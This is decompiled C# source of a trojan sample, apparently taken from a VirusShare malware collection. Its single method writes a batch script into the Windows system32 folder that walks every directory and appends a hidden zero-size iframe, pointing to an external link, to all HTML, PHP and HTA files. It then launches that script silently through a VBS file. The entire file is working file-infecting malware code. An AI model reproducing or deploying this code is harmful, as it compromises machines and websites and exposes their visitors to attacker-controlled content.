// Decompiled with JetBrains decompiler
// Type: WoRmy3.inject
// Assembly: WoRmy3, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1B26AE86-BB0F-48C4-8B57-1FB3CCAD5BD2
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.Win32.Reconyc.eggt-0a9369ef164691ad2732dc205399f3a03b3ae27182245bcbe5919174ce030c3c.exe

using Microsoft.VisualBasic.CompilerServices;
using System.Diagnostics;
using System.IO;

namespace WoRmy3
{
  [StandardModule]
  internal sealed class inject
  {
    public static void inject_sp()
    {
      StreamWriter streamWriter1 = new StreamWriter((Stream) new FileStream("C:\\windows\\system32\\sys.bat", FileMode.Create, FileAccess.Write));
      streamWriter1.BaseStream.Seek(0L, SeekOrigin.End);
      streamWriter1.WriteLine("dir /s /ad /b C:\\* >tmp.dll");
      streamWriter1.WriteLine("for /f \"delims=\" %%t in (tmp.dll) do (");
      streamWriter1.WriteLine("for /f %%o in (%%t\\*.html,%%t\\*.htm,%%t\\*.php,%%t\\*.hta) do (");
      streamWriter1.WriteLine("echo ^<iframe src=\"" + install.link + "\"height=0 width=0^> >>%%o");
      streamWriter1.WriteLine("))");
      streamWriter1.Close();
      StreamWriter streamWriter2 = new StreamWriter((Stream) new FileStream("C:\\windows\\system32\\exec.vbs", FileMode.Create, FileAccess.Write));
      streamWriter2.BaseStream.Seek(0L, SeekOrigin.End);
      streamWriter2.WriteLine("Dim oShell");
      streamWriter2.WriteLine("Set oShell = WScript.CreateObject (\"WScript.Shell\")");
      streamWriter2.WriteLine("oShell.run \"C:\\windows\\system32\\sys.bat\",0,True");
      streamWriter2.WriteLine("Set oShell = Nothing ");
      streamWriter2.Close();
      Process.Start("C:\\windows\\system32\\exec.vbs");
    }
  }
}
